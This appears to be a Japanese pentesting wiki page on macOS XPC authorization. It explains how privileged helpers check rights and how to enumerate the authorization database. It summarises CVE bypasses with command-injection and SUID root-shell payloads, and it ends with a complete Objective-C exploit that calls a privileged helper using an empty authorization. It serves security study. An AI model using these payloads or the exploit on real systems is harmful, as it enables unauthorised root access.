# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Appleは、接続元のprocessに**公開されたXPC methodを呼び出す権限があるか**を認証する別の方法も提供しています。

アプリケーションが**privileged userとしてactionを実行する必要がある**場合、通常はアプリ自体をprivileged userとして実行する代わりに、rootとしてHelperToolをXPC serviceとしてinstallし、アプリから呼び出してそれらのactionを実行します。ただし、serviceを呼び出すアプリには十分なauthorizationが必要です。

### ShouldAcceptNewConnection always YES

[EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample)に例があります。`App/AppDelegate.m`では、**HelperTool**への**connect**を試みます。また、`HelperTool/HelperTool.m`の**`shouldAcceptNewConnection`** functionは、前述のrequirementsを**一切checkしません**。常にYESをreturnします:<sup>[1]</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
詳細については、この check を適切に設定する方法を参照してください。


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Application rights

ただし、**HelperTool の method が呼び出された際に authorization が実行されます**。

`App/AppDelegate.m` の **`applicationDidFinishLaunching` function** は、アプリの起動後に空の authorization reference を作成します。これは常に成功するはずです。\
その後、`setupAuthorizationRights` を呼び出して、その authorization reference に **いくつかの rights を追加**しようとします。
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
`Common/Common.m` の関数 `setupAuthorizationRights` は、アプリケーションの rights を auth database `/var/db/auth.db` に保存します。データベースにまだ存在しない rights のみを追加する点に注目してください:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
`enumerateRightsUsingBlock` 関数は、`commandInfo` で定義されているアプリケーションの権限を取得するために使用されます。
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
これは、このプロセスの終了時に、`commandInfo` 内で宣言された権限が `/var/db/auth.db` に保存されることを意味します。ここでは、**認証が必要**となる**各 method**について、**permission name**と**`kCommandKeyAuthRightDefault`**を確認できます。後者は、**誰がこの right を取得できるか**を示します。

right にアクセスできるユーザーを示すための、さまざまな scope があります。その一部は [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) で定義されています（[すべてはこちら](https://www.dssw.co.uk/reference/authorization-rights/)で確認できます）。要約すると次のとおりです。

<table><thead><tr><th width="284.3333333333333">名前</th><th width="165">値</th><th>説明</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>誰でも可能</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>誰も不可</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>現在のユーザーが admin（admin group 内）である必要がある</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>ユーザーに認証を求める</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>ユーザーに認証を求める。admin（admin group 内）である必要がある</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>ルールを指定する</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>right に関する追加コメントを指定する</td></tr></tbody></table>

### Rights Verification

`HelperTool/HelperTool.m` では、**`readLicenseKeyAuthorization`** 関数が **`checkAuthorization`** 関数を呼び出し、caller がその **method を実行する**権限を持っているか確認します。この関数は、calling process から送信された **authData** が**正しい形式**であるかを確認し、その後、特定の method を呼び出すための **right**を取得するのに**何が必要か**を確認します。すべて問題なければ、返される **`error` は `nil`** になります。
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
そのメソッドを呼び出すための**権限を取得する要件を確認する**場合、関数 `authorizationRightForCommand` は、先ほどコメントアウトされていたオブジェクト **`commandInfo`** のみをチェックします。その後、**その関数を呼び出す権限があるか**を確認するために **`AuthorizationCopyRights`** を呼び出します（flags によってユーザーとの対話が可能になる点に注意してください）。

この場合、関数 `readLicenseKeyAuthorization` を呼び出すための `kCommandKeyAuthRightDefault` は `@kAuthorizationRuleClassAllow` に定義されています。つまり、**誰でも呼び出すことができます**。

### DB Information

この情報は `/var/db/auth.db` に保存されていると説明しました。次のコマンドで保存されているすべてのルールを一覧表示できます。
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
その後、以下を使用して、その権限にアクセスできるユーザーを確認できます：
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permissive rights

**すべての権限設定**は[**こちら**](https://www.dssw.co.uk/reference/authorization-rights/)で確認できますが、ユーザーの操作を必要としない組み合わせは次のとおりです。

1. **'authenticate-user': 'false'**
- これは最も直接的なキーです。`false`に設定すると、この権限を取得するためにユーザーが認証情報を提供する必要がないことを指定します。
- これは、**以下の2つのいずれかと組み合わせるか、ユーザーが所属している必要があるグループを指定する場合に使用されます**。
2. **'allow-root': 'true'**
- ユーザーがroot user（昇格された権限を持つユーザー）として操作しており、このキーが`true`に設定されている場合、root userは追加の認証なしでこの権限を取得できる可能性があります。ただし通常、root userの状態になるにはすでに認証が必要なため、ほとんどのユーザーにとってこれは「認証不要」のシナリオではありません。
3. **'session-owner': 'true'**
- `true`に設定すると、sessionの所有者（現在ログインしているユーザー）が自動的にこの権限を取得します。ユーザーがすでにログインしている場合、追加の認証を回避できる可能性があります。
4. **'shared': 'true'**
- このキーは、認証なしで権限を付与するものではありません。`true`に設定すると、権限の認証後に、各プロセスが再認証することなく複数のプロセス間でその権限を共有できることを意味します。ただし、`'authenticate-user': 'false'`などの他のキーと組み合わせない限り、権限の初回付与には認証が必要です。

[**このスクリプト**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9)を使用して、興味深い権限を取得できます。
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Authorization Bypass Case Studies

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: 特権 Mach service `com.acustica.HelperTool` はすべての接続を受け入れ、その `checkAuthorization:` ルーチンは `AuthorizationCopyRights(NULL, …)` を呼び出すため、任意の 32 バイトの blob が通過します。続いて `executeCommand:authorization:withReply:` は攻撃者が制御するカンマ区切りの文字列を root として `NSTask` に渡すため、次のような payload が可能です。
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
trivially SUID root shell を作成できます。詳細は[こちらの write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)。<sup>[6]</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: listener は常に YES を返し、`checkAuthorization:` には同じ NULL `AuthorizationCopyRights` パターンが現れます。`exchangeAppWithReply:` は attacker の入力を `system()` string に2回連結するため、`appPath` に shell metacharacters（例: `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`）を注入すると、Mach service `com.plugin-alliance.pa-installationhelper` 経由で root code execution が可能になります。詳細は[こちら](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)。<sup>[7]</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: audit を実行すると `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist` が作成され、Mach service `com.jamf.complianceeditor.helper` が公開されます。また、caller の `AuthorizationExternalForm` や code signature を検証せずに `-executeScriptAt:arguments:then:` を export します。trivial exploit では、空の reference を `AuthorizationCreate` し、`[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` で接続して、その method を呼び出すことで、root として arbitrary binaries を実行できます。完全な reversing notes（PoC 付き）は[Mykola Grymalyuk の write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)にあります。<sup>[4]</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14、7.2.0–7.2.8、7.4.0–7.4.2 は、authorization gates のない privileged helper に到達する crafted XPC messages を受け入れていました。この helper は自身の privileged `AuthorizationRef` を信頼していたため、service に message を送信できる local user であれば、root として arbitrary configuration changes や commands を実行させることができました。詳細は[SentinelOne の advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)にあります。<sup>[5]</sup>

#### Rapid triage tips

- app が GUI と helper の両方を提供している場合は、それぞれの code requirements を比較し、`shouldAcceptNewConnection` が `-setCodeSigningRequirement:` で listener を lock しているか（または `SecCodeCopySigningInformation` を検証しているか）を確認します。チェックがない場合、通常は Jamf case のような CWE-863 scenarios になります。簡単な確認例は次のとおりです:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- helper が何を認可していると考えているかと、client が提供する内容を比較します。reverse 時には `AuthorizationCopyRights` に break を設定し、`AuthorizationRef` が helper 自身の privileged context ではなく、`AuthorizationCreateFromExternalForm` に由来する（client が提供したもの）ことを確認します。そうでなければ、上記のケースと同様の CWE-863 pattern を発見した可能性が高くなります。

## Authorization の reverse

### EvenBetterAuthorization が使用されているかの確認

関数 **`[HelperTool checkAuthorization:command:]`** が見つかった場合、その process は前述の authorization schema を使用している可能性が高いです。

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

この関数が `AuthorizationCreateFromExternalForm`、`authorizationRightForCommand`、`AuthorizationCopyRights`、`AuhtorizationFree` などの関数を呼び出している場合、[**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) を使用しています。

**`/var/db/auth.db`** を確認し、user interaction なしで privileged action を呼び出す権限を取得できるか確認します。

### Protocol Communication

次に、XPC service との communication を確立できるように、protocol schema を見つける必要があります。

関数 **`shouldAcceptNewConnection`** は、export される protocol を示します。

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

この場合、EvenBetterAuthorizationSample と同じものになっています。[**この行を確認してください**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)。

使用されている protocol の名前が分かれば、次のコマンドで **header definition を dump** できます。
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
最後に、通信を確立するために、公開されている **Mach Service の名前** を知る必要があります。これを確認する方法はいくつかあります。

- 使用されている Mach Service を確認できる **`[HelperTool init]`** 内：

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist 内：
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Example

この例では、以下を作成します。

- functions を含む protocol の定義
- access を要求するために使用する空の auth
- XPC service への connection
- connection に成功した場合の function 呼び出し
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## 悪用されたその他の XPC privilege helper

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[8]</sup>

## 参考資料

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([GitHub 上のミラー](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Authorization Services](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Jamf Compliance Editor の特権昇格](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: FortiClient Mac の特権昇格の脆弱性](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – macOS 上の Aquarius Desktop における Acustica Audio HelperTool XPC Service のローカル特権昇格](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Plugin Alliance InstallationHelper XPC Service のローカル特権昇格](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Apple EndpointSecurity framework の特権昇格 (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

{{#include ../../../../../banners/hacktricks-training.md}}
